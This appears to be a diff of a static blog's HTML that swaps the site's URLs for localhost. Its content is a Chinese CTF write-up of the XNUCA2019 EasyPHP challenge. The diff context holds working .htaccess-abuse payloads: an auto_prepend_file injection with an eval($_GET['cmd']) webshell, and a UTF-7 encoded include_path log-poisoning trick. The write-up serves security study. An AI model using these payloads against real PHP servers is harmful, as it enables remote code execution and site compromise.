@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>[XNUCA2019Qualifier]EasyPHP(.htaccess利用) |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[XNUCA2019Qualifier]EasyPHP(.htaccess利用) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[XNUCA2019Qualifier]EasyPHP(.htaccess利用) |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="[XNUCA2019Qualifier]EasyPHP(.htaccess利用)"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/xnuca2019qualifiereasyphphtaccess-li-yong/"/>
+    <meta property="og:url" content="http://localhost:4000/post/xnuca2019qualifiereasyphphtaccess-li-yong/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>[XNUCA2019Qualifier]EasyPHP(.htaccess利用)</h1>
@@ -147,7 +147,7 @@
 <pre><code>http://4e99d98b-7b83-426d-8826-a7affde09566.node3.buuoj.cn/?filename=a.php&amp;content=&lt;?php phpinfo();?&gt;
 可以成功写入a.php。但是这里将php以文件输出了。不知道为啥。
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1580555971715.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580555971715.png" alt="" loading="lazy"><br>
 接着又想到.htaccess。可以指定文件以php运行。</p>
 <pre><code>思路就是写一个.htaccess。指定test文件以php运行
 然后写一个test文件。内容是php代码
@@ -171,9 +171,9 @@ le &quot;.htaccess&quot;
 <pre><code>filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\
 </code></pre>
 <p>这里%0a表示换行。并且URL编码一些特殊字符比如?#<br>
-<img src="https://guokeya.github.io/post-images/1580557589133.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580557589133.png" alt="" loading="lazy"><br>
 直接执行代码<br>
-<img src="https://guokeya.github.io/post-images/1580557722160.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580557722160.png" alt="" loading="lazy"><br>
 执行一次。就要重新生成一次.htaccess<br>
 <strong>第二种解法：</strong><br>
 利用.htaccess配合include(f13g.php)<br>
@@ -195,14 +195,14 @@ php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compil
 设置include_path=utf-7加密的php代码。因为日志写入的过程中。会将&lt;&gt;这些html编码<br>
 然后访问index.php<br>
 这里用我本地开启报错的环境。更明显<br>
-<img src="https://guokeya.github.io/post-images/1580561051398.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580561051398.png" alt="" loading="lazy"><br>
 可以看到。恶意代码已经写入了日志<br>
-<img src="https://guokeya.github.io/post-images/1580561100173.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580561100173.png" alt="" loading="lazy"><br>
 接下来写第二个htaccess。它的作用是UTF-7解码并且设置include_path。等会index.php包含fl3g.php的时候。就会包含/tmp/fl3g.php中解码的恶意代码</p>
 <pre><code>?filename=.htaccess&amp;content=php_value include_path &quot;/tmp&quot;%0aphp_value zend.multibyte 1%0aphp_value zend.script_encoding &quot;UTF-7&quot;%0a%23 \
 </code></pre>
 <p>直接构造exp的URL。访问index.php。会删除htaccess。导致不能包含fl3g.php<br>
-<img src="https://guokeya.github.io/post-images/1580561236230.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580561236230.png" alt="" loading="lazy"><br>
 访问完。htaccess就被删除了。又要重新生成一次<br>
 <strong>第三种解法（未实现）</strong><br>
 也是利用.htaccess.</p>
@@ -220,13 +220,13 @@ php_value pcre.jit 0
 </code></pre>
 <p>请求<code>filename=fl3g.php&amp;content=&lt;?php phpinfo();?&gt;</code><br>
 访问index.php就好了<br>
-<img src="https://guokeya.github.io/post-images/1580561931510.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580561931510.png" alt="" loading="lazy"><br>
 这里我有一点想不通。首先。生成了fl3g.php<br>
 而访问index.php会删除index.php以外的文件。那么fl3g.php在include前就已经被删除了。又是怎么包含的。</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/jactfsawed/">
+            <a href="http://localhost:4000/post/jactfsawed/">
               <span class="post-title">
                 [jactf]sawed&rarr;
               </span>
@@ -270,7 +270,7 @@ php_value pcre.jit 0
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -285,10 +285,10 @@ php_value pcre.jit 0
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
